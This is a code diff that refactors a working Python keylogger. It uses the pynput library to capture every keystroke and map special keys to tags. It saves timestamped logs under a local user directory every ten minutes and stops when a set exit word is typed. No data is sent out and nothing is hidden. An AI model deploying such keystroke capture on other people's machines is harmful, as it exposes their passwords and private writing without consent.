@@ -1,69 +1,93 @@
-import datetime, time
+import datetime
+import atexit
+import os
+import time
 from pynput.keyboard import Listener
 
-LOG_BASE_FILE = "/home/suchi/.local/logs/"
+# Interval in seconds
+INTERVAL = 60 * 10
+LOG_BASE_DIR = "/home/suchi/.local/logs/"
+EXITCODE = "exkeylog"
+
+key_mapping = {
+    'Key.ctrl': '<CTRL>',
+    'Key.enter': '<ENTER>',
+    'Key.space': '<SPACE>',
+    'Key.backspace': '<BS>',
+    'Key.shift_r': '<SHIFT>',
+    'Key.shift': '<SHIFT>',
+    'Key.alt_r': '<ALT>',
+    'Key.alt': '<ALT>',
+    'Key.caps_lock': '<CL>',
+    'Key.tab': '<TAB>',
+    'Key.cmd': '<MOD>',
+    '<65027>': '',
+}
+
 
 def write_to_log(buffer, start):
-    d = datetime.datetime.now().strftime('%y-%m-%d_%H-%M-%S')
-    filename = LOG_BASE_FILE + 'keylogger_{}.txt'.format(d)
+    date = datetime.datetime.now().strftime('%y-%m-%d')
+    end = datetime.datetime.now().strftime('%y-%m-%d_%H-%M-%S')
+    filename = LOG_BASE_DIR + 'keylogger_{}.txt'.format(date)
 
-    buffer = start + " - " + d + "\n\n" + buffer + "\n\n"
+    if (buffer.strip() == ""):
+        return
+
+    buffer = f"{start} - {end}\n\n{buffer}\n\n"
 
     with open(filename, 'a') as f:
         f.write(buffer)
 
 
 def key_listener():
+    global RUN
     global BUFFER
+    global time0
+    global start
 
     BUFFER = ''
     start = datetime.datetime.now().strftime('%y-%m-%d_%H-%M-%S')
-    time0=time.time()
+    time0 = time.time()
 
     def key_recorder(key):
+        global RUN
         global BUFFER
+        global time0
 
         key = str(key)
-        if key == 'Key.ctrl':
-            BUFFER += '<CTRL>'
-        elif key == 'Key.enter':
-            BUFFER += '<ENTER>'
-        elif key == 'Key.space':
-            BUFFER += '<SPACE>'
-        elif key == 'Key.backspace':
-            BUFFER += '<BS>'
-        elif key == 'Key.shift_r':
-            BUFFER += '<SHIFT>'
-        elif key == 'Key.shift':
-            BUFFER += '<SHIFT>'
-        elif key == 'Key.alt_r':
-            BUFFER += '<ALT>'
-        elif key == 'Key.alt':
-            BUFFER += '<ALT>'
-        elif key == 'Key.caps_lock':
-            BUFFER += '<CL>'
-        elif key == 'Key.tab':
-            BUFFER += '<TAB>'
-        elif key == 'Key.cmd':
-            BUFFER += '<MOD>'
-        elif key == '<65027>':
-            BUFFER += ''
+        if key in key_mapping:
+            BUFFER += key_mapping[key]
         else:
             BUFFER += key.replace("'", "")
 
-        if "exkeylog" in BUFFER.lower():
+        if EXITCODE in BUFFER.lower():
             write_to_log(BUFFER, start)
             print("Exiting key logger.")
-            exit(0)
+            RUN = False
+            listener.stop()
+            return
 
-    if time.time()-time0 > 6000:
-        write_to_log(BUFFER, start)
-        BUFFER = ''
-
+        if (time.time() - time0 > INTERVAL):
+            time0 = time.time()
+            write_to_log(BUFFER, start)
+            BUFFER = ''
 
     with Listener(on_press=key_recorder) as listener:
         listener.join()
 
 
-while True:
+def on_exit():
+    global BUFFER, start
+    write_to_log(BUFFER, start)
+
+
+# Check if the directory exists, and create it if it doesn't
+if not os.path.exists(LOG_BASE_DIR):
+    os.makedirs(LOG_BASE_DIR)
+
+atexit.register(on_exit)
+
+RUN = True
+
+while (RUN):
     key_listener()
